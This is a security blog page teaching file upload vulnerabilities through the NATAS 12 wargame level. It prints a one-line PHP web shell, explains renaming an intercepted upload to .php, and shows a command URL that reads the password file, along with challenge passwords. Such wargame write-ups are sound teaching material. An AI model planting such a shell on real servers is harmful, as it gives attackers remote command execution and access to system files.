<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Chejarla Santosh Kumar</title>
	<link href="my logo.jpg" rel="icon" type="image/jpg" />
	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CVarela+Round" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Owl Carousel -->
	<link type="text/css" rel="stylesheet" href="css/owl.carousel.css" />
	<link type="text/css" rel="stylesheet" href="css/owl.theme.default.css" />

	<!-- Magnific Popup -->
	<link type="text/css" rel="stylesheet" href="css/magnific-popup.css" />

	<!-- Font Awesome Icon -->
	<link rel="stylesheet" href="css/font-awesome.min.css">

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>

<body>

	<!-- Header -->
	<header>

		<!-- Nav -->
		<nav id="nav" class="navbar">
			<div class="container">

				<div class="navbar-header">
					<!-- Logo -->
					<div class="navbar-brand">
						<a href="index.html">
							<img class="logo" src="img/my logo.jpg" alt="logo">
						</a>
					</div>
					<!-- /Logo -->

					<!-- Collapse nav button -->
					<div class="nav-collapse">
						<span></span>
					</div>
					<!-- /Collapse nav button -->
				</div>

				<!--  Main navigation  -->
				<ul class="main-nav nav navbar-nav navbar-right">
					<li><a href="index.html">Home</a></li>
					<li><a href="web-intro.html">Web exploitation</a></li>
					<li><a href="recon.html">Recon</a></li>
					<li><a href="android.html">Android exploitation</a></li>
					<li><a href="random.html">Random stuff</a></li>
					<li><a href="CV/resume.html">Resume</a></li>
					<li><a href="index.html#contact">Contact</a></li>
				</ul>
				<!-- /Main navigation -->

			</div>
		</nav>
		<!-- /Nav -->

		<!-- header wrapper -->
		<div class="header-wrapper sm-padding bg-grey">
				<div class="container">
					<h2>Web exploitation</h2>
					<ul class="breadcrumb">
						<li class="breadcrumb-item"><a href="index.html">Home</a></li>
						<li class="breadcrumb-item"><a href="web-intro.html">web</a></li>
						<li class="breadcrumb-item"><a href="web-fileupload.html">File upload vuln.</a></li>
					</ul>
				</div>
			</div>
		<!-- /header wrapper -->

	</header>
	<!-- /Header -->

	<!-- Blog -->
	<div id="blog" class="section md-padding">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<!-- Main -->
				<main id="main" class="col-md-9">
					<div class="blog">
						<div class="blog-img">
							<img class="img-responsive" src="./img/wiki/fileupload/file.png" alt="">
						</div>
						<div class="blog-content">
							<ul class="blog-meta">
								<li><i class="fa fa-user"></i>CHS</li>
								<li><i class="fa fa-clock-o"></i>29th Jul 2018</li>
								<!--<li><i class="fa fa-comments"></i>57</li>-->
							</ul>
							<h1 id="fileuploadvulnerability">File upload vulnerability</h1>

<h2 id="owaspdescription">OWASP Description</h2>

<p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step.</p>

<p>The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored.</p>

<p>There are really two classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multi-part encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it.</p>

<p>The other class of problem is with the file size or content. The range of problems here depends entirely on what the file is used for. See the examples below for some ideas about how files might be misused. To protect against this type of attack, you should analyse everything your application does with files and think carefully about what processing and interpreters are involved.</p>

<h2 id="impact">Impact</h2>

<ul>
<li>The attacker can get a webshell and execute various commands,browse system files and browse local resources etc.</li>

<li><i class="fa fa-check"></i> Make a phishing page in the website</li>

<li><i class="fa fa-check"></i> Make a permenant XSS in the website</li>

<li><i class="fa fa-check"></i> Uploaded sensitive files might be accessible by unauthorised people.</li>

<li><i class="fa fa-check"></i> Uploaded files might trigger vulnerabilities in broken libraries/applications on the client side.</li>

<li><i class="fa fa-check"></i> Uploaded files might trigger vulnerabilities in broken libraries/applications on the server side.</li>

<li><i class="fa fa-check"></i> Uploaded files might trigger vulnerabilities in broken real-time monitoring tools.</li>
</ul>

<p>The impact of this vulnerability is high, supposed code can be executed in the server context or on the client side. The likelihood of detection for the attacker is high. The prevalence is common. As a result the severity of this type of vulnerability is high.</p>

<h3 id="exploreityourself">Explore it yourself :</h3>

<p>Make a PHP file to test the vulnerability locally in your system with the code mentioned here.</p>

<p>shell.php</p>

<pre><code class="php language-php">&lt;?php
echo system($_GET["cmd"]);
?&gt;
</code></pre>

<p></p>

<h2 id="letstryachallenge">Let's try a challenge</h2>

<p>NATAS 12 :</p>

<ul>
<li><p>USERNAME : natas12</p></li>

<li><p>PASSWORD : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 </p>

<p><img src="img/wiki/fileupload/natas12.1.png" alt="natas12" height="500em"/></p></li>
</ul>

<p>You can see that we can upload a file here. Let's try to upload a file so that we can get a shell on the website.</p>

<p>Make the shell.php file. We can pass the commands through the URL.</p>

<p>Now let's upload the PHP file. But during the upload, we should change the .jpeg format to .php by intercepting the request.</p>

<p><img src="img/wiki/fileupload/natas12.3.png" alt="natas12" height="500em" /></p>

<p>Once you open the link generated by the site, we can start exploiting by giving the commands we desired. Once we get the shell we can do various things.
</br></br>
The password for the next level will be in the folder /etc/natas_webpass/
where natas12 is the file containing the password.</p>

<p>so...</p>

<pre><code>.php?cmd=cat  /etc/natas_webpass/natas12
</code></pre>

<p>Gives the password : jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</br></br>
<img src="img/wiki/fileupload/natas12.5.png" alt="natas12" width="1000em"/></p>

<p>This is a basic example of File upload vulnerability.</p>
						</div>


						<!-- blog author -->
						<div class="blog-author">
							<div class="media">
								<div class="media-left">
									<img class="media-object" src="my logo.jpg" height="150em" alt="">
								</div>
								<div class="media-body">
									<div class="media-heading">
										<h3>CHS</h3>
										<div class="author-social">
											<a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a>
											<a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a>
											<a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a>
											<a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a>
										</div>
									</div>
									<p>With the info in the post you can try some CTF's where you can explore different aspects of this vulnerability.This is a First shot I'll try to improve the post in the future</p>
								</div>
							</div>
						</div>
						<!-- /blog author -->

					</div>
				</main>
				<!-- /Main -->


				<!-- Aside -->
				<aside id="aside" class="col-md-3">

					<!-- Category -->
					<div class="widget">
						<h3 class="title">Topics</h3>
						<div class="widget-category">
								<a href="web-intro.html">Intro</a>
							<a href="#">File upload</a>
							<a href="web-localfile.html">Local file inclusion</a>
							<a href="web-sql.html">SQL injections</a>

						</div>
					</div>


				</aside>
				<!-- /Aside -->

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</div>
	<!-- /Blog -->

	<!-- Footer -->
	<footer id="footer" class="sm-padding bg-dark">

		<!-- Container -->
		<div class="container">

			<!-- Row -->
			<div class="row">

				<div class="col-md-12">

					<!-- footer logo -->
					<div class="footer-logo">
						<a href="index.html"><img src="img/my logo.jpg" alt="logo"></a>
					</div>
					<!-- /footer logo -->

					<!-- footer follow -->
					<ul class="footer-follow">
						<li><a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a></li>
						<li><a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a></li>
						<li><a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a></li>
						<li><a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a></li>
					</ul>
					<!-- /footer follow -->

					<!-- footer copyright -->
					<div class="footer-copyright">
						<p>Copyright © 2017. All Rights Reserved. Designed by <a href="https://colorlib.com" target="_blank">Colorlib</a></p>
					</div>
					<!-- /footer copyright -->

				</div>

			</div>
			<!-- /Row -->

		</div>
		<!-- /Container -->

	</footer>
	<!-- /Footer -->

	<!-- Back to top -->
	<div id="back-to-top"></div>
	<!-- /Back to top -->

	<!-- Preloader -->
	<div id="preloader">
		<div class="preloader">
			<span></span>
			<span></span>
			<span></span>
			<span></span>
		</div>
	</div>
	<!-- /Preloader -->

	<!-- jQuery Plugins -->
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<script type="text/javascript" src="js/owl.carousel.min.js"></script>
	<script type="text/javascript" src="js/jquery.magnific-popup.js"></script>
	<script type="text/javascript" src="js/main.js"></script>

</body>

</html>
